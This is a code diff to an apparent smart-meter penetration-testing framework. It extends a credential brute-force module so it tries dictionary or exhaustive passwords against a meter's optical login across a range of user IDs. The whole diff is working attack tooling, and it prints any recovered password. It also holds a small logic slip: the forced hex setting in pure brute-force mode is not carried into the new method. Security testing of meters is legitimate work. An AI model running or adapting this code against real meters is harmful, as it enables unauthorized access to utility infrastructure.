@@ -42,6 +42,7 @@ from termineter.utilities import StringGenerator
 
 class BruteForce:
 	def __init__(self, dictionary_path=None):
+		self.dictionary_path = dictionary_path
 		if dictionary_path is None:
 			self.dictionary = None
 		else:
@@ -57,7 +58,6 @@ class BruteForce:
 				yield password
 				password = self.dictionary.readline()
 			self.dictionary.close()
-		raise StopIteration
 
 def from_hex(data):
 	return binascii.a2b_hex(data)
@@ -65,53 +65,43 @@ def from_hex(data):
 def to_hex(data):
 	return binascii.b2a_hex(data).decode('utf-8')
 
+
+
 class Module(TermineterModuleOptical):
 	connection_state = TermineterModuleOptical.connection_states.none
 	def __init__(self, *args, **kwargs):
 		TermineterModuleOptical.__init__(self, *args, **kwargs)
-		self.author = ['Spencer McIntyre']
+		self.author = ['Spencer McIntyre', 'David Garlak (@vexance)']
 		self.description = 'Brute Force Credentials'
 		self.detailed_description = 'This module is used for brute forcing credentials on the smart meter.  Passwords are not limited to ASCII values and in order to test the entire character space the user will have to provide a dictionary of hex strings and set USE_HEX to true.'
 		self.options.add_boolean('USE_HEX', 'values in word list are in hex', default=True)
 		self.options.add_rfile('DICTIONARY', 'dictionary of passwords to try', required=False, default='$DATA_PATH smeter_passwords.txt')
 		self.options.add_string('USERNAME', 'user name to attempt to log in as', default='0000')
 		self.options.add_integer('USER_ID', 'user id to attempt to log in as', default=1)
+		self.options.add_integer('USER_ID_RANGE', 'number of subsequent user id\'s to attempt following USER_ID', default=0)
 
 		self.advanced_options.add_boolean('PURE_BRUTEFORCE', 'perform a pure bruteforce', default=False)
 		self.advanced_options.add_boolean('STOP_ON_SUCCESS', 'stop after the first successful login', default=True)
 		self.advanced_options.add_float('DELAY', 'time in seconds to wait between attempts', default=0.20)
 
-	def run(self):
+
+	def bruteforce_user(self, bf: BruteForce, current_id: int) -> bool:
+		self.frmwk.print_status("Attempting brute force on user id '{current}'".format(current=current_id))
 		conn = self.frmwk.serial_connection
 		logger = self.logger
 		use_hex = self.options['USE_HEX']
-		dictionary_path = self.options['DICTIONARY']
 		username = self.options['USERNAME']
-		user_id = self.options['USER_ID']
 		time_delay = self.advanced_options['DELAY']
-
-		if len(username) > 10:
-			self.frmwk.print_error('Username cannot be longer than 10 characters')
-			return
-		if not (0 <= user_id <= 0xffff):
-			self.frmwk.print_error('User id must be between 0 and 0xffff')
-			return
-
-		if self.advanced_options['PURE_BRUTEFORCE']:
-			self.frmwk.print_status('A pure brute force will take a very very long time')
-			use_hex = True  # if doing a prue brute force, it has to be True
-			pw_generator = BruteForce()
-		else:
-			if not os.path.isfile(dictionary_path):
-				self.frmwk.print_error('Can not find dictionary path')
-				return
-			pw_generator = BruteForce(dictionary_path)
-
 		hex_regex = re.compile('^([0-9a-fA-F]{2})+$')
 
-		self.frmwk.print_status('Starting brute force')
+		# Essentially just reset the iterator on the wordlist
+		# When brute forcing user_id's, if we don't reset the iterator no passwords will
+		# be attempted for user_id's after the first one
+		wordlist = BruteForce(bf.dictionary_path)
 
-		for password in pw_generator:
+		successful = False
+
+		for password in wordlist:
 			if not self.advanced_options['PURE_BRUTEFORCE']:
 				if use_hex:
 					password = password.strip()
@@ -131,20 +121,54 @@ class Module(TermineterModuleOptical):
 			while not conn.start():
 				time.sleep(time_delay)
 			time.sleep(time_delay)
-			if conn.login(username, user_id, password):
+			if conn.login(username, current_id, password):
+				successful = True
 				if use_hex:
-					self.frmwk.print_good('Successfully logged in. Username: ' + username + ' User ID: ' + str(user_id) + ' Password: ' + to_hex(password))
+					self.frmwk.print_good('Successfully logged in. Username: ' + username + ' User ID: ' + str(current_id) + ' Password: ' + to_hex(password))
 				else:
-					self.frmwk.print_good('Successfully logged in. Username: ' + username + ' User ID: ' + str(user_id) + ' Password: ' + password)
+					self.frmwk.print_good('Successfully logged in. Username: ' + username + ' User ID: ' + str(current_id) + ' Password: ' + password)
 				if self.advanced_options['STOP_ON_SUCCESS']:
 					conn.stop(force=True)
 					break
 			else:
 				if use_hex:
-					logger.warning('Failed logged in. Username: ' + username + ' User ID: ' + str(user_id) + ' Password: ' + to_hex(password))
+					logger.warning('Failed logged in. Username: ' + username + ' User ID: ' + str(current_id) + ' Password: ' + to_hex(password))
 				else:
-					logger.warning('Failed logged in. Username: ' + username + ' User ID: ' + str(user_id) + ' Password: ' + password)
+					logger.warning('Failed logged in. Username: ' + username + ' User ID: ' + str(current_id) + ' Password: ' + password)
 			while not conn.stop(force=True):
 				time.sleep(time_delay)
 			time.sleep(time_delay)
+
+		if not successful:
+			self.frmwk.print_error(f'Failed to brute force user id \'{current_id}\'')
 		return
+
+
+	def run(self):
+		dictionary_path = self.options['DICTIONARY']
+		username = self.options['USERNAME']
+		user_id = self.options['USER_ID']
+		use_hex = self.options['USE_HEX']
+
+		if len(username) > 10:
+			self.frmwk.print_error('Username cannot be longer than 10 characters')
+			return
+		if not (0 <= user_id <= 0xffff):
+			self.frmwk.print_error('User id must be between 0 and 0xffff')
+			return
+
+		if self.advanced_options['PURE_BRUTEFORCE']:
+			self.frmwk.print_status('A pure brute force will take a very very long time')
+			use_hex = True  # if doing a prue brute force, it has to be True
+			pw_generator = BruteForce()
+		else:
+			if not os.path.isfile(dictionary_path):
+				self.frmwk.print_error('Can not find dictionary path')
+				return
+			pw_generator = BruteForce(dictionary_path)
+
+		for attempt in range(user_id, 1+self.options['USER_ID_RANGE']+user_id): # [id, id + range)
+			self.bruteforce_user(pw_generator, attempt)
+
+		return
+
